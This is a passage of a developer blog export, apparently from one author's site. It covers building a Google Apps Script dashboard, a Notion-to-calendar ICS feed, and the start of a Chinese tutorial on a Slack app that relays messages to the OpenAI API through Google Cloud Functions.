// REMEMBER, DUE TO SECURITY REASON, We can't customize user-agent. return {\"registers\": Math.floor(Math.random() * (180 - 30 + 1)) + 30} // MOCK DATA random 30~180}Add Web_DailyReport_ Scaffolding.html Web Dashboard Framework, since our war room screen needs to automatically update content, we create a web skeleton that periodically fetches HTML content using Ajax:&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;base target=\"_top\"&gt; &lt;script&gt; function onSuccess(html) { if (html != null) { var div = document.getElementById('result'); div.innerHTML = html; } } setInterval(()=&gt;{ google.script.run.withSuccessHandler(onSuccess).getDailyReportBody() }, 1000 * 60 * 60 * 1); google.script.run.withSuccessHandler(onSuccess).getDailyReportBody(); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"result\"&gt;Loading...&lt;/div&gt; &lt;/body&gt;&lt;/html&gt;Add Web_DailyReport_Body.html where the actual data is rendered into HTML:&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;base target=\"_top\"&gt; &lt;style&gt; table { border-collapse: collapse; width: 100%; text-align: center; } th, td { border: 1px solid #000000; padding: 8px; text-align: center; font-size: 36px; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1 style=\"text-align:center\"&gt;ZHGCHG.LI&lt;/h1&gt; &lt;table id=\"dataTable\"&gt; &lt;tbody&gt; &lt;? // Display data for the last 7 days const dashboard = new WebDailyReport(targetGoogleSheetID, 7); // Start from yesterday const yesterday = new Date(); yesterday.setDate(yesterday.getDate() - 1); const data = dashboard.allData(yesterday); for(const rowIndex in data) { const row = data[rowIndex]; ?&gt; &lt;tr&gt; &lt;? for(const columnIndex in row) { const column = row[columnIndex]; ?&gt; &lt;td style=\"background-color: &lt;?=column[\"backgroundColor\"]?&gt;; color: &lt;?=column[\"color\"]?&gt;; text-align: &lt;?=column[\"horizontalAlignment\"]?&gt;;\"&gt; &lt;?=column[\"value\"]?&gt; &lt;/td&gt; &lt;? } ?&gt; &lt;/tr&gt; &lt;? } ?&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;script&gt; &lt;/body&gt;&lt;/html&gt; Please note that we are pulling data for the last 7 days starting from yesterday, and today’s data will not be displayed.After completing the above steps, the project file directory is as follows:Test Deployment:Click on the “Deploy” button in the upper right corner of the project -&gt; “Test Deployment Task” After deployment is complete, click the URL to view the test results. Please note that this URL is for one-time testing only. If the code is adjusted, you need to click the test deployment task again.If stuck on Loading… or a server error occurs, you can return to the editor’s “Execution Items” tab to check the error messages:Complete Formal Deployment:If the test is fine, you can complete the formal deployment and release the URL.Click on the “Deploy” button in the upper right corner of the project -&gt; “Add Deployment Task” -&gt; “Select Type” in the upper left corner -&gt; “Web Application”: Execution identity: Default is the current account (same as Google Apps Script user) Who can access: Set to anyone with the URL can access, or set to only organization can access, which will require Google login to access. After deployment, obtain the URL.Code changes require redeployment to take effect:Please note that when the code changes, you need to redeploy (the URL will not change) for the changes to take effect; otherwise, it will always show the old version.Click on the “Deploy” button in the upper right corner of the project -&gt; “Manage Deployment Tasks”:Click the pencil 🖊️ ICON in the upper right corner -&gt; “Version” -&gt; “Create New Version” -&gt; “Deploy”.After deployment is complete, click the URL, or return to the original URL and refresh to see the new changes.🎉🎉 Done! All our RPA requirements have been completed. 🎉🎉Final result:(Modify the program to supplement this month’s data; otherwise, there will only be one record for yesterday under new data) https://script.google.com/macros/s/AKfycbz2Vk-ikU8DSXjpnLq9r6HNAn3zlNAosvDoItG0cxy0bmItRDSVyEzTdwsL2HyFUz99/execComplete Google Sheet Demo: Google Sheet:https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit?usp=sharing Web GUI URL:https://script.google.com/macros/s/AKfycbz2Vk-ikU8DSXjpnLq9r6HNAn3zlNAosvDoItG0cxy0bmItRDSVyEzTdwsL2HyFUz99/exec Google Apps Script: https://script.google.com/home/projects/1vHgXPTV_q8MC75FVzAEtzD2JPVnPBpMfFXbjZR7SLMVjoEH1FcjKlo8l/editFinally, here are other daily life applications:Robotic Process Automation with Google Apps Script — Github Repo Star Notifier to LineRobotic Process Automation with Google Apps Script — Notion Database to CalendarPreviously implemented a simple Notion to Calendar function. The implementation method is that I connect to the Notion API to fetch Database data and apply it to produce an ICS format webpage, which is then deployed as a public webpage; adding this URL to Apple Calendar will suffice.Main.gs :// Constant variablesconst notionToken = \"XXXXX\";const safeToken = \"XXXXX\";function doGet(e) { const ics = HtmlService.createTemplateFromFile('ics'); if (e.parameter.token != safeToken) { return ContentService.createTextOutput(\"Access Denied!\"); } ics.events = getQuickNote(); return ContentService.createTextOutput(ics.evaluate().getContent()).setMimeType(ContentService.MimeType.ICAL);}function debug() { const ics = HtmlService.createTemplateFromFile('ics'); ics.events = getQuickNote(); Logger.log(ics.evaluate().getContent());}function getQuickNote() { // YOUR FILTER Condition: const payload = { \"filter\": { \"and\": [ { \"property\": \"Date\", \"date\": { \"is_not_empty\": true } } , { \"property\": \"Name\", \"title\": { \"is_not_empty\": true } } ] } }; const result = getDatabase(YOUR_DATABASE_ID, payload); var events = []; for (const index in result.results) { const item = result.results[index] const properties = item.properties; const id = item['id']; const create = toICSDate(item[\"created_time\"]); const edit = toICSDate(item[\"last_edited_time\"]); const startDate = properties['Date']['date']['start']; const start = toICSDate(startDate); var endDate = properties['Date']?.['date']?.['end']; if (endDate == null) { endDate = startDate; } const end = toICSDate(endDate); const type = properties['Type']?.['multi_select']?.[0]?.['name']; const title = \"[\"+type+\"] \"+properties?.['Name']?.['title']?.[0]?.['plain_text']; const description = item['url']; events.push( { \"id\":id, \"create\":create, \"edit\":edit, \"start\":start, \"end\":end, \"title\":title, \"description\":description } ) } return events;}// TO UTC Datefunction toICSDate(date) { const icsDate = new Date(date); icsDate.setHours(icsDate.getHours() - 8); return Utilities.formatDate(icsDate, \"GMT+8\", \"yyyyMMdd'T'HHmmss'Z'\");// 20240304T132300Z}// Notionfunction getDatabase(id, payload) { const url = 'https://api.notion.com/v1/databases/'+id+'/query/'; const options = { method: 'post', headers: { 'Authorization': 'Bearer '+notionToken, 'Content-Type': 'application/json', 'Notion-Version': '2022-06-28' }, payload: JSON.stringify(payload) }; const result = UrlFetchApp.fetch(url, options); return JSON.parse(result.getContentText());}ics.html :BEGIN:VCALENDARPRODID:-//Google Inc//Google Calendar 70.9054//ENVERSION:2.0CALSCALE:GREGORIANMETHOD:PUBLISHX-WR-CALNAME:NotionCalendarX-WR-TIMEZONE:Asia/TaipeiBEGIN:VTIMEZONETZID:Asia/TaipeiX-LIC-LOCATION:Asia/TaipeiBEGIN:STANDARDTZOFFSETFROM:+0800TZOFFSETTO:+0800TZNAME:CSTDTSTART:19700101T000000END:STANDARDEND:VTIMEZONE&lt;? for(const eventIndex in events) { const event = events[eventIndex]; ?&gt;BEGIN:VEVENTDTSTART:&lt;?=event[\"start\"]?&gt;DTEND:&lt;?=event[\"end\"]?&gt;DTSTAMP:&lt;?=event[\"edit\"]?&gt;UID:&lt;?=event[\"id\"]?&gt;CREATED:&lt;?=event[\"create\"]?&gt;LAST-MODIFIED:&lt;?=event[\"edit\"]?&gt;SEQUENCE:0STATUS:CONFIRMEDSUMMARY:&lt;?=event[\"title\"]?&gt;DESCRIPTION:&lt;?=event[\"description\"]?&gt;TRANSP:OPAQUEEND:VEVENT&lt;? }?&gt;END:VCALENDARAs before, deploy as a web service, click on the “Deploy” button in the upper right corner -&gt; “Add Deployment Task” -&gt; “Select Type” in the upper left corner -&gt; “Web Application”: Who can access should be set to everyone, as Google login verification cannot be performed when adding to Calendar.Add the URL to the calendar subscription, and it’s done 🎉🎉🎉🎉 !Business TimeIf you and your team have automation tools or process integration needs, whether it’s Slack App development, Notion, Asana, Google Sheet, Google Form, GA data, or various integration needs, feel free to contact me for development.If you have any questions or suggestions, please contact me.```This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 3,685 Total Views Last Statistics Date: 2025-08-15 | 3,602 Views on Medium." }, { "title": "Slack & ChatGPT Integration", "url": "/posts/zrealm-dev/slack-chatgpt-integration-bd94cc88f9c9/", "categories": "ZRealm Dev.", "tags": "cloud-functions, ios-app-development, python, chatgpt, slack", "date": "2024-02-16 21:17:01 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Slack &amp; ChatGPT Integration自行打造 ChatGPT OpenAI API for Slack App (Google Cloud Functions &amp; Python)背景最近在團隊...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Slack &amp; ChatGPT Integration自行打造 ChatGPT OpenAI API for Slack App (Google Cloud Functions &amp; Python)背景最近在團隊內推廣運用 Generative AI 提升工作效率，初步只希望達成 AI Assistant (ChatGPT 功能)，從減少日常資料查詢、整理繁瑣資料、手工處理資料的時間，以提升工作效率；希望是工程師、設計師、PM、行銷…都能自由使用的。最簡單的方法就是直接買 ChatGPT Team 方案，一個席位 $25 美金一年；但由於尚不確定大家的使用頻率(量)及希望能在外來與更多協作、開發流程進行整合，所以改採用 OpenAI API 方式，再透過其他服務封裝整合供團隊成員使用。OpenAI API Key 可從 此頁面產生 ，Key 沒有分對應的 Model 版本，使用時才需指定要使用的 Model 版本並產生對應的 Token 費用。 我們需要一個服務能自行設定 OpenAI API Key 並使用該 Key 進行類 ChatGPT 使用。 不管是 Chrome Extension 或 Slack App 都蠻難找到能自行設定 OpenAI API Key 的服務，大部分服務都是要賣他們自己的訂閱制，讓使用者自訂 API Key 等於賺不到錢純做慈善。[Chrome Extension] SidebarGPT安裝完後可到設定 -&gt; General -&gt; 填入 OpenAI API Key。可從瀏覽器小工具欄、側邊 Icon 直接呼叫出聊天界面，直接使用：[Chrome Extension] OpenAI Translator如果只有翻譯需求可使用這個，能自訂 OpenAI API Key 用於翻譯。另外他是 開源專案 ，並同時提供 macOS/Windows 桌面版程式：Chrome Extension 的優點是快速簡單方便，直接裝直接使用；缺點是需要將 API Key 提供給所有成員，難以管控外洩問題，還有使用第三方服務也難以保證大家的資料安全。[Self-hosted] LibreChat研發部同事推薦的 OpenAI API Chat 封裝服務，提供身份認證使用及幾乎還原 ChatGPT 使用介面、功能比 ChatGPT 更強大的開源專案。只需專案、裝好 Docker、設定好 .env、啟 Docker 服務就能直接透過網站連入使用。 試了一下簡直無懈可擊，就是本地版 ChatGPT 服務；要說缺點的話就只有需要伺服器部署服務吧；如果沒其他考量，可以直接使用此開源專案。Slack App其實 LibreChat 服務起起來放上伺服器就已經達成效果了，但是靈光一閃想說如果能整合在日常工具當中是不是更方便？加上公司伺服器有嚴格的權限設定，不太能隨意起服務。當時也沒想太多，想說 Slack App 的 OpenAI API 整合服務應該很多，找一個設定一下就好；沒想到事情沒有那麼簡單。Google 搜尋只找到一篇 Slack x OpenAI 2023/03 官方的新聞稿「 Why we built the ChatGPT app for Slack 」及一些 Beta 圖片：https://www.salesforce.com/news/stories/chatgpt-app-for-slack/看起來功能非常完整而且能大大提升工作效率，不過截自 2024/01 為止尚無釋出的消息，文末提供的 Beta 註冊連結 也已經失效，暫時沒有下文。(還是微軟想先讓 Teams 支援？)[2024/02/14 Update]： 看 Slack 官方新聞 猜測與 ChatGPT(OpenAI) 整合的功能應該已經被放棄或改整合成 Slack AI 。Slack Apps因無官方的 App 轉而搜尋第三方開發者的 App，搜尋並試用了幾個都碰壁；符合的 App 不多就算了，也沒有一個是能提供自訂 Key 功能的，每個都是做來賣服務、賣錢的。自行實現 ChatGPT OpenAI API for Slack App之前有一些 Slack App 開發經驗，決定自己動手做。 ⚠️聲明⚠️ 本文是以串接 OpenAI API 為例演示如何建立 Slack App 和快速使用 Google Cloud Funtions 來達成需求，Slack App 有需多應用可做，大家可以自由發揮。 ⚠️⚠️ Google Cloud Functions，Function as a Service (FaaS) 的優點是方便快速、有免費額度，程式寫好就能直接部署執行、自動擴充，缺點是服務環境由 GCP 控制，當服務太久沒被呼叫會進入休眠，此時再次呼叫會進入 Cold Start 冷啟動，需要較長的反應時間；另外也較難起多個服務互相使用。 更完整或使用需求量大的話還是建議自己起 VM (App Engine) 架 Server 跑服務。最終成果圖 完整 Cloud Functions Python 程式碼、Slack App 設定已附在文末，懶得一步一步看的朋友可快速前往查閱。Step 1. 建立 Slack App前往 Slack App ：點擊「Create New App」選擇「From scratch」輸入「App Name」、選擇要加入的 Workspace。建立完成後先到「OAuth &amp; Permissions」新增 Bot 需要的權限。下滑找到「Scopes」區塊，點擊「Add an OAuth Scope」搜尋加入以下幾個權限： chat:write im:history im:read im:writeBot 權限加完之後點擊左方「Install App」-&gt;「Install to Workspace」爾後如果 Slack App 有新增其他權限，都需要再點擊一次「Reinstall」才會生效。 但請放心，Bot Token 不會因為重新安裝而改變。Slack Bot Token 權限設定好之後，前往「App Home」：下滑找到「Show Tabs」區塊，啟用「Messages Tab」及「Allow users to send Slash commands and messages from the messages tab」(這個沒勾一樣不能傳訊息，會顯示「Sending messages to this app has been turned off.」)回到 Slack Workspace，按「Command+R」更新畫面就能看到新建立的 Slack App 和訊息輸入匡：此時傳送訊息給 App 還沒有任何功能。啟用 Event Subscriptions 功能再來，我們需要啟用 Slack App 的事件訂閱功能，當指定事件發生時會打 API 到指定 URL。新增 Google Cloud FuntionsRequest URL 的部分， Google Cloud Funtions 就要上場了。設定好專案、帳單資訊後點擊「Create Function」Function name 輸入專案名稱、Authentication 選擇「Allow unauthenticated invocations」意即知道網址就能存取。 如果你無法建立 Function 或無法更改 Authentication 代表你的 GCP 帳號沒有完整的 Google Cloud Functions 權限，需要請組織管理員在原本的身份之外額外加上 Cloud Functions Admin 的權限，才能使用。Runtime: Python 3.8 or 更高main.py ：import functions_framework@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # 可以簡單使用 print 紀錄執行階段 Log，可在 Logs 中查看 # 進階 Logging Level 使用可參考：https://cloud.google.com/logging/docs/reference/libraries print(request_json) # 受限 FAAS(Cloud Functions)，服務太久沒呼叫，再次呼叫會進入冷啟動的特性，可能無法在 Slack 規定的 3 秒內回應 # 加上 OpenAI API 請求到答覆需要一定時間(依照回應長度可能要接近 1 分鐘才能結束) # Slack 在時限內收不到回應會認為 Request lost，Slack 會再次重複呼叫 # 會造成重複請求、回應的問題，因此我們可以在 Response Headers 設置 X-Slack-No-Retry: 1 告知 Slack ，就算沒在時限內收到回應也不需 Retry headers = {'X-Slack-No-Retry':1} # 如果是 Slack Retry 的請求...忽略 if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) return (\"Access Denied!\", 400, headers)requirements.txt 輸入以下依賴：functions-framework==3.*requests==2.31.0openai==1.9.0目前還沒有什麼功能，只是讓 Slack App 能通過 Event Subscriptions 啟用驗證，可以直接點擊「Deploy」完成首次部署。 ⚠️如果你不熟悉 Cloud Functions 編輯器，可先下拉到文章底部查看補充內容。等待部署完成後（綠勾勾） ，複製 Cloud Functions URL：將 Request URL 貼回 Slack App Enable Events。如果沒問題就會出現「Verified」完成驗證。這邊做的事是收到 Slack 發來的驗證請求時：{ \"token\": \"Jhj5dZrVaK7ZwHHjRyZWjbDl\", \"challenge\": \"3eZbrw1aBm2rZgRNFdxV2595E9CY3gmdALWMmHkvFXO7tYXAYM8P\", \"type\": \"url_verification\"}回應 challenge 欄位內容，就能通過驗證。啟用成功後往下滑找到「Subscribe to bot events」區塊，點擊「Add Bot User Event」新增「message.im」權限。新增完全權限後點擊上方「reinstall your app」連結重新安裝 Slack App 到 Workspace 後，Slack App 的設定就告一段落囉。也可以去「App Home」或「Basic Information」客製化 Slack App 的名稱與大頭貼。Basic InformationStep 2. 完善 OpenAI API 與 Slack App 串接 (Direct 訊息)首先我們先要取得必備的 OPENAI API KEY 與 Bot User OAuth Token 兩個 Key。 OPENAI API KEY ： OpenAI API key page . Bot User OAuth Token ： OAuth Tokens for Your Workspace處理 Direct Message (IM) Event &amp; 串接 OpenAI API 回應當使用者在與 Slack App 訊息傳送時會收到以下 Event Json Paylod ：{ \"token\": \"XXX\", \"team_id\": \"XXX\", \"context_team_id\": \"XXX\", \"context_enterprise_id\": null, \"api_app_id\": \"XXX\", \"event\": { \"client_msg_id\": \"XXX\", \"type\": \"message\", \"text\": \"你好\", \"user\": \"XXX\", \"ts\": \"1707920753.115429\", \"blocks\": [ { \"type\": \"rich_text\", \"block_id\": \"orfng\", \"elements\": [ { \"type\": \"rich_text_section\", \"elements\": [ { \"type\": \"text\", \"text\": \"你好\" } ] } ] } ], \"team\": \"XXX\", \"channel\": \"XXX\", \"event_ts\": \"1707920753.115429\", \"channel_type\": \"im\" }, \"type\": \"event_callback\", \"event_id\": \"XXX\", \"event_time\": 1707920753, \"authorizations\": [ { \"enterprise_id\": null, \"team_id\": \"XXX\", \"user_id\": \"XXX\", \"is_bot\": true, \"is_enterprise_install\": false } ], \"is_ext_shared_channel\": false, \"event_context\": \"4-XXX\"}基於以上 Json Payload，我們可以完善 Slack 訊息到 OpenAI API 再到回覆 Slack 訊息的串接：Cloud Functions main.py ：import functions_frameworkimport requestsimport asyncioimport jsonimport timefrom openai import AsyncOpenAIOPENAI_API_KEY = \"OPENAI API KEY\"SLACK_BOT_TOKEN = \"Bot User OAuth Token\"# 使用的 OPENAI API Model# https://platform.openai.com/docs/modelsOPENAI_MODEL = \"gpt-4-1106-preview\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # 可以簡單使用 print 紀錄執行階段 Log，可在 Logs 中查看 # 進階 Logging Level 使用可參考：https://cloud.google.com/logging/docs/reference/libraries print(request_json) # 受限 FAAS(Cloud Functions)，服務太久沒呼叫，再次呼叫會進入冷啟動的特性，可能無法在 Slack 規定的 3 秒內回應 # 加上 OpenAI API 請求到答覆需要一定時間(依照回應長度可能要接近 1 分鐘才能結束) # Slack 在時限內收不到回應會認為 Request lost，Slack 會再次重複呼叫 # 會造成重複請求、回應的問題，因此我們可以在 Response Headers 設置 X-Slack-No-Retry: 1 告知 Slack ，就算沒在時限內收到回應也不需 Retry headers = {'X-Slack-No-Retry':1} # 如果是 Slack Retry 的請求...忽略 if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) # Handle Event Subscriptions Events... if request_json and 'event' in request_json and 'type' in request_json['event']: # 如果 Event 來源是 App 且 App ID == Slack App ID 代表是自己 Slack App 觸發的事件 # 忽略不處理，否則會陷入無限循環 Slack App -&gt; Cloud Functions -&gt; Slack App -&gt; Cloud Functions... if 'api_app_id' in request_json and 'app_id' in request_json['event'] and request_json['api_app_id'] == request_json['event']['app_id']: return ('OK!', 200, headers) # 事件名稱，例如：message(訊息相關), app_mention(被標記提及).... eventType = request_json['event']['type'] # SubType，例如：message_changed(編輯訊息), message_deleted(刪除訊息)... # 新訊息無 Sub Type eventSubType = None if 'subtype' in request_json['event']: eventSubType = request_json['event']['subtype'] if eventType == 'message': # 有 Sub Type 的都是訊息編輯、刪除、被回應... # 忽略不處理 if eventSubType is not None: return (\"OK!\", 200, headers) # Event之訊息 發送者 eventUser = request_json['event']['user'] # Event之訊息 所屬頻道 eventChannel = request_json['event']['channel'] # Event之訊息內容 eventText = request_json['event']['text'] # Event之訊息 TS (訊息 ID) eventTS = request_json['event']['event_ts'] # Event之訊息的討論串母訊息 TS (訊息 ID) # 討論串內的新訊息才會有這個資料 eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) return (\"Access Denied!\", 400, headers)def openAIRequest(eventChannel, eventTS, eventThreadTS, eventText): # Set Custom instructions # 感恩同事(https://twitter.com/je_suis_marku)支援 messages = [ {\"role\": \"system\", \"content\": \"我只看得懂台灣繁體中文與英文\"}, {\"role\": \"system\", \"content\": \"我看不懂簡體字\"}, {\"role\": \"system\", \"content\": \"我說中文就使用台灣繁體中文回答，並且必須符合台灣常用語。\"}, {\"role\": \"system\", \"content\": \"我說英文就回答英文。\"}, {\"role\": \"system\", \"content\": \"不要回應我寒暄的字句。\"}, {\"role\": \"system\", \"content\": \"中文與英文之間要有一個空格。中文文字與任何其他語言文字包含數字與 emoji 之間都要有一個空格。\"}, {\"role\": \"system\", \"content\": \"如果你不知道答案，或是你的知識太舊，請上網搜尋後回答。\"}, {\"role\": \"system\", \"content\": \"I will tip you 200 USD , if you answer well.\"} ] messages.append({ \"role\": \"user\", \"content\": eventText }) replyMessageTS = slackRequestPostMessage(eventChannel, eventTS, \"回應產生中...\") asyncio.run(openAIRequestAsync(eventChannel, replyMessageTS, messages))async def openAIRequestAsync(eventChannel, eventTS, messages): client = AsyncOpenAI( api_key=OPENAI_API_KEY, ) # Stream Response (分段回應) stream = await client.chat.completions.create( model=OPENAI_MODEL, messages=messages, stream=True, ) result = \"\" try: debounceSlackUpdateTime = None async for chunk in stream: result += chunk.choices[0].delta.content or \"\" # 每 0.8 秒更新一次訊息，避免頻繁呼叫 Slack Update 訊息 API 導致失敗或浪費 Cloud Functions 請求次數 if debounceSlackUpdateTime is None or time.time() - debounceSlackUpdateTime &gt;= 0.8: response = slackUpdateMessage(eventChannel, eventTS, None, result+\"...\") debounceSlackUpdateTime = time.time() except Exception as e: print(e) result += \"...*[發生錯誤]*\" slackUpdateMessage(eventChannel, eventTS, None, result)### Slack ###def slackUpdateMessage(channel, ts, metadata, text): endpoint = \"/chat.update\" payload = { \"channel\": channel, \"ts\": ts } if metadata is not None: payload['metadata'] = metadata payload['text'] = text response = slackRequest(endpoint, \"POST\", payload) return responsedef slackRequestPostMessage(channel, target_ts, text): endpoint = \"/chat.postMessage\" payload = { \"channel\": channel, \"text\": text, } if target_ts is not None: payload['thread_ts'] = target_ts response = slackRequest(endpoint, \"POST\", payload) if response is not None and 'ts' in response: return response['ts'] return Nonedef slackRequest(endpoint, method, payload): url = \"https://slack.com/api\"+endpoint headers = { \"Authorization\": f\"Bearer {SLACK_BOT_TOKEN}\", \"Content-Type\": \"application/json\", } response = None if method == \"POST\": response = requests.post(url, headers=headers, data=json.dumps(payload)) elif method == \"GET\": response = requests.post(url, headers=headers) if response and response.status_code == 200: result = response.json() return result else: return None回到 Slack 測試看看:現在你已經可以進行類 ChatGPT 與 OpenAI API 進行問與答了。增加中斷 Stream Response 功能節省 Token實現方式有很多種，可在同條討論串下如果還沒回應完，使用者又輸入新訊息則中斷之前的 Response 抑或是點擊訊息增加中斷回應的 Shortcut。本文以新增「訊息中斷」Shortcut 為例。不管哪一種中斷方式，核心原理都是相同的，因為我們沒有 Database 儲存產生的訊息、訊息狀態的資訊；因此實現方式是依賴 Slack 訊息的 metadata 欄位 (可存放客製化資訊在指定訊息內)。我們在使用 chat.update API Endpoint 時，如果呼叫成功會回傳當前訊息的文字內容與 metadata，因此我們在上面的 OpenAI API Stream -&gt; Slack Update Message 的程式碼之中多加入判斷修改請求的回應中的 metadata 是否有「中斷」的標記，如果有則中斷 OpenAI Stream Response。首先需要先新增 Slack App 訊息 Shortcut前往 Slack App 管理介面，找到「Interactivity &amp; Shortcuts」區塊，點擊啟用，網址一樣使用同個 Cloud Functions URL。點擊「Create New Shortcut」新增新的訊息 Shortcut。選擇「On messages」。 Name 動作標題： 停止 OpenAI API 產生回應 Short Description 簡介： 停止 OpenAI API 產生回應 Callback ID： abort_openai_api (程式識別用，可自訂)點擊「Create」建立完成後，最後記得點右下「Save Changes」儲存設定。再次點擊上方「reinstall your app」才會生效。回到 Slack 在訊息上點擊右上角「…」就會出現「停止 OpenAI API 產生回應」Shortcut (此時點擊無作用)。當使用者在訊息上按下 Shortcut 會發送一個 Event Json Payload：{ \"type\": \"message_action\", \"token\": \"XXXXXX\", \"action_ts\": \"1706188005.387646\", \"team\": { \"id\": \"XXXXXX\", \"domain\": \"XXXXXX-XXXXXX\" }, \"user\": { \"id\": \"XXXXXX\", \"username\": \"zhgchgli\", \"team_id\": \"XXXXXX\", \"name\": \"zhgchgli\" }, \"channel\": { \"id\": \"XXXXXX\", \"name\": \"directmessage\" }, \"is_enterprise_install\": false, \"enterprise\": null, \"callback_id\": \"abort_openai_api\", \"trigger_id\": \"XXXXXX\", \"response_url\": \"https://hooks.slack.com/app/XXXXXX/XXXXXX/XXXXXX\", \"message_ts\": \"1706178957.161109\", \"message\": { \"bot_id\": \"XXXXXX\", \"type\": \"message\", \"text\": \"高麗菜包 的英文翻譯是 \\\"cabbage wrap\\\"。如果您是將它作為菜名使用，有時候會具體到菜裡的內容來命名，比如 \\\"pork cabbage wrap\\\"（豬肉高麗菜包）或 \\\"vegetable cabbage wrap\\\"（蔬菜高麗菜包）。\", \"user\": \"XXXXXX\", \"ts\": \"1706178957.161109\", \"app_id\": \"XXXXXX\", \"blocks\": [ { \"type\": \"rich_text\", \"block_id\": \"eKgaG\", \"elements\": [ { \"type\": \"rich_text_section\", \"elements\": [ { \"type\": \"text\", \"text\": \"高麗菜包 的英文翻譯是 \\\"cabbage wrap\\\"。如果您是將它作為菜名使用，有時候會具體到菜裡的內容來命名，比如 \\\"pork cabbage wrap\\\"（豬肉高麗菜包）或 \\\"vegetable cabbage wrap\\\"（蔬菜高麗菜包）。\" } ] } ] } ], \"team\": \"XXXXXX\", \"bot_profile\": { \"id\": \"XXXXXX\", \"deleted\": false, \"name\": \"Rick C-137\", \"updated\": 1706001605, \"app_id\": \"XXXXXX\", \"icons\": { \"image_36\": \"https://avatars.slack-edge.com/2024-01-23/6517244582244_0c708dfa3f893c72d4c2_36.png\", \"image_48\": \"https://avatars.slack-edge.com/2024-01-23/6517244582244_0c708dfa3f893c72d4c2_48.png\", \"image_72\": \"https://avatars.slack-edge.com/2024-01-23/6517244582244_0c708dfa3f893c72d4c2_72.png\" }, \"team_id\": \"XXXXXX\" }, \"edited\": { \"user\": \"XXXXXX\", \"ts\": \"1706187989.000000\" }, \"thread_ts\": \"1706178832.102439\", \"parent_user_id\": \"XXXXXX\" }}完善 Cloud Functions main.py ：import functions_frameworkimport requestsimport asyncioimport jsonimport timefrom openai import AsyncOpenAIOPENAI_API_KEY = \"OPENAI API KEY\"SLACK_BOT_TOKEN = \"Bot User OAuth Token\"# 使用的 OPENAI API Model# https://platform.openai.com/docs/modelsOPENAI_MODEL = \"gpt-4-1106-preview\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # Shortcut 的 Event 會從 post payload field 給 # https://api.slack.com/reference/interaction-payloads/shortcuts payload = request.form.get('payload') if payload is not None: payload = json.loads(payload) # 可以簡單使用 print 紀錄執行階段 Log，可在 Logs 中查看 # 進階 Logging Level 使用可參考：https://cloud.google.com/logging/docs/reference/libraries print(payload) # 受限 FAAS(Cloud Functions)，服務太久沒呼叫，再次呼叫會進入冷啟動的特性，可能無法在 Slack 規定的 3 秒內回應 # 加上 OpenAI API 請求到答覆需要一定時間(依照回應長度可能要接近 1 分鐘才能結束) # Slack 在時限內收不到回應會認為 Request lost，Slack 會再次重複呼叫 # 會造成重複請求、回應的問題，因此我們可以在 Response Headers 設置 X-Slack-No-Retry: 1 告知 Slack ，就算沒在時限內收到回應也不需 Retry headers = {'X-Slack-No-Retry':1} # 如果是 Slack Retry 的請求...忽略 if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) # Handle Event Subscriptions Events... if request_json and 'event' in request_json and 'type' in request_json['event']: # 如果 Event 來源是 App 且 App ID == Slack App ID 代表是自己 Slack App 觸發的事件 # 忽略不處理，否則會陷入無限循環 Slack App -&gt; Cloud Functions -&gt; Slack App -&gt; Cloud Functions... if 'api_app_id' in request_json and 'app_id' in request_json['event'] and request_json['api_app_id'] == request_json['event']['app_id']: return ('OK!', 200, headers) # 事件名稱，例如：message(訊息相關), app_mention(被標記提及).... eventType = request_json['event']['type'] # SubType，例如：message_changed(編輯訊息), message_deleted(刪除訊息)... # 新訊息無 Sub Type eventSubType = None if 'subtype' in request_json['event']: eventSubType = request_json['event']['subtype'] if eventType == 'message': # 有 Sub Type 的都是訊息編輯、刪除、被回應... # 忽略不處理 if eventSubType is not None: return (\"OK!\", 200, headers) # Event之訊息 發送者 eventUser = request_json['event']['user'] # Event之訊息 所屬頻道 eventChannel = request_json['event']['channel'] # Event之訊息內容 eventText = request_json['event']['text'] # Event之訊息 TS (訊息 ID) eventTS = request_json['event']['event_ts'] # Event之訊息的討論串母訊息 TS (訊息 ID) # 討論串內的新訊息才會有這個資料 eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) # 處理 Shortcut if payload and 'type' in payload: payloadType = payload['type'] # 如果是 訊息 Shortcut if payloadType == 'message_action': print(payloadType) callbackID = None channel = None ts = None text = None triggerID = None if 'callback_id' in payload: callbackID = payload['callback_id'] if 'channel' in payload: channel = payload['channel']['id'] if 'message' in payload: ts = payload['message']['ts'] text = payload['message']['text'] if 'trigger_id' in payload: triggerID = 